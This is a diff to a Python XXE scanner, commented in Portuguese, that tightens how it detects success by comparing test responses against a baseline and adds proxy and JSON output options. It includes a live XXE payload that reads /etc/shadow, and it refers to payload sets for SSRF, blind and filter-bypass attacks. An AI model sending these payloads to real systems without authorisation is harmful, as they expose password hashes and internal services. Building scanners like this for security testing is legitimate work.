@@ -47,7 +47,9 @@ from mytools.core.utils import (
     color,
     create_async_client,
     create_banner,
+    init_scanner,
     print_exploit_info,
+    print_json,
     run_main_loop,
     safe_asyncio_run,
     write_output,
@@ -169,7 +171,7 @@ _FILE_READ_PAYLOADS_DEFAULT: list[tuple[str, str, str, list[str]]] = [
         "shadow_read",
         '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/shadow">]><root>&xxe;</root>',
         "generic",
-        ["root:", "$6$", "!"],
+        ["root:", "$6$"],
     ),
     (
         "cmdline_read",
@@ -478,19 +480,45 @@ async def _test_baseline(client: httpx.AsyncClient, url: str) -> tuple[int, int,
         return 0, 0, b""
 
 
+_GENERIC_INDICATORS: frozenset[str] = frozenset({"response", ""})
+
+
 def _check_xxe_response(
     body: bytes,
     status: int,
     indicators: list[str],
+    baseline_body: bytes = b"",
+    baseline_status: int | None = None,
+    baseline_size: int | None = None,
 ) -> bool:
-    """Verifica se a resposta indica XXE bem-sucedido."""
+    """Verifica se a resposta indica XXE bem-sucedido.
 
-    text = body.decode("utf-8", errors="ignore").lower()
+    Indicadores unicos (ex.: "root:", "$6$", "ami-id") exigem baseline diff:
+    presentes no corpo do teste e ausentes no corpo baseline. Indicadores
+    genericos (ex.: "response") nao contam como substring; para eles so ha
+    evidencia quando a resposta difere do baseline (status mudou ou
+    |size_test - size_base| > 50).
+    """
 
     if status == 0:
         return False
 
-    return any(indicator.lower() in text for indicator in indicators)
+    text = body.decode("utf-8", errors="ignore").lower()
+
+    unique = [
+        ind for ind in indicators if ind.strip().lower() not in _GENERIC_INDICATORS
+    ]
+
+    if not unique:
+        if baseline_status is None or baseline_size is None:
+            return False
+        status_changed = status != baseline_status
+        size_changed = abs(len(body) - baseline_size) > 50
+        return status_changed or size_changed
+
+    b_text = baseline_body.decode("utf-8", errors="ignore").lower()
+
+    return any(ind.lower() in text and ind.lower() not in b_text for ind in unique)
 
 
 def _build_xxe_body(payload: str, encoding: str = "generic") -> tuple[bytes, str]:
@@ -514,7 +542,7 @@ async def _test_detect(
 
     attempts: list[XXEAttempt] = []
 
-    b_status, b_size, _ = baseline
+    b_status, b_size, b_body = baseline
 
     for technique, payload, fmt, indicators in _DETECT_PAYLOADS:
         body, ct = _build_xxe_body(payload)
@@ -533,7 +561,14 @@ async def _test_detect(
 
             status_changed = t_status != b_status
 
-            vulnerable = _check_xxe_response(resp.content, t_status, indicators)
+            vulnerable = _check_xxe_response(
+                resp.content,
+                t_status,
+                indicators,
+                baseline_body=b_body,
+                baseline_status=b_status,
+                baseline_size=b_size,
+            )
 
             attempts.append(
                 XXEAttempt(
@@ -590,7 +625,7 @@ async def _test_file_read(
 
     attempts: list[XXEAttempt] = []
 
-    b_status, b_size, _ = baseline
+    b_status, b_size, b_body = baseline
 
     for technique, payload, fmt, indicators in _FILE_READ_PAYLOADS:
         body, ct = _build_xxe_body(payload)
@@ -609,7 +644,14 @@ async def _test_file_read(
 
             status_changed = t_status != b_status
 
-            vulnerable = _check_xxe_response(resp.content, t_status, indicators)
+            vulnerable = _check_xxe_response(
+                resp.content,
+                t_status,
+                indicators,
+                baseline_body=b_body,
+                baseline_status=b_status,
+                baseline_size=b_size,
+            )
 
             attempts.append(
                 XXEAttempt(
@@ -666,7 +708,7 @@ async def _test_ssrf(
 
     attempts: list[XXEAttempt] = []
 
-    b_status, b_size, _ = baseline
+    b_status, b_size, b_body = baseline
 
     for technique, payload, fmt, indicators in _SSRF_PAYLOADS:
         body, ct = _build_xxe_body(payload)
@@ -685,7 +727,14 @@ async def _test_ssrf(
 
             status_changed = t_status != b_status
 
-            vulnerable = _check_xxe_response(resp.content, t_status, indicators)
+            vulnerable = _check_xxe_response(
+                resp.content,
+                t_status,
+                indicators,
+                baseline_body=b_body,
+                baseline_status=b_status,
+                baseline_size=b_size,
+            )
 
             attempts.append(
                 XXEAttempt(
@@ -742,7 +791,7 @@ async def _test_blind(
 
     attempts: list[XXEAttempt] = []
 
-    b_status, b_size, _ = baseline
+    b_status, b_size, b_body = baseline
 
     for technique, payload, fmt, indicators in _BLIND_PAYLOADS:
         body, ct = _build_xxe_body(payload)
@@ -761,7 +810,14 @@ async def _test_blind(
 
             status_changed = t_status != b_status
 
-            vulnerable = _check_xxe_response(resp.content, t_status, indicators)
+            vulnerable = _check_xxe_response(
+                resp.content,
+                t_status,
+                indicators,
+                baseline_body=b_body,
+                baseline_status=b_status,
+                baseline_size=b_size,
+            )
 
             attempts.append(
                 XXEAttempt(
@@ -818,7 +874,7 @@ async def _test_bypass(
 
     attempts: list[XXEAttempt] = []
 
-    b_status, b_size, _ = baseline
+    b_status, b_size, b_body = baseline
 
     for technique, payload, fmt, indicators in _BYPASS_PAYLOADS:
         body, ct = _build_xxe_body(payload, fmt)
@@ -837,7 +893,14 @@ async def _test_bypass(
 
             status_changed = t_status != b_status
 
-            vulnerable = _check_xxe_response(resp.content, t_status, indicators)
+            vulnerable = _check_xxe_response(
+                resp.content,
+                t_status,
+                indicators,
+                baseline_body=b_body,
+                baseline_status=b_status,
+                baseline_size=b_size,
+            )
 
             attempts.append(
                 XXEAttempt(
@@ -955,12 +1018,14 @@ async def run_scan(
     concurrency: int,
     output_file: str | None,
     verbose: bool,
+    proxy: str | None = None,
+    json_output: bool = False,
 ) -> int:
     """Executa o scan XXE."""
 
     tls = target.startswith("https")
 
-    client = create_async_client(timeout=timeout)
+    client = create_async_client(timeout=timeout, proxy=proxy)
 
     try:
         print(color(f"\n  Conectando a {target}...", Cyber.CYAN))
@@ -1029,7 +1094,10 @@ async def run_scan(
             overall_status=overall,
         )
 
-        print_results(result)
+        if json_output:
+            print_json(asdict(result))
+        else:
+            print_results(result)
 
         if output_file:
             write_output(output_file, asdict(result))
@@ -1094,6 +1162,8 @@ def build_parser() -> argparse.ArgumentParser:
 def run_once(args: argparse.Namespace) -> int:
     """Executa um scan XXE a partir de argumentos parseados."""
 
+    init_scanner(args)
+
     logger.info("XXE scan iniciado para %s", args.url)
 
     categories: list[str] = []
@@ -1109,6 +1179,8 @@ def run_once(args: argparse.Namespace) -> int:
             concurrency=getattr(args, "concurrency", 5),
             output_file=getattr(args, "output", None),
             verbose=getattr(args, "verbose", False),
+            proxy=getattr(args, "proxy", None),
+            json_output=getattr(args, "json_output", False),
         ),
     )
 
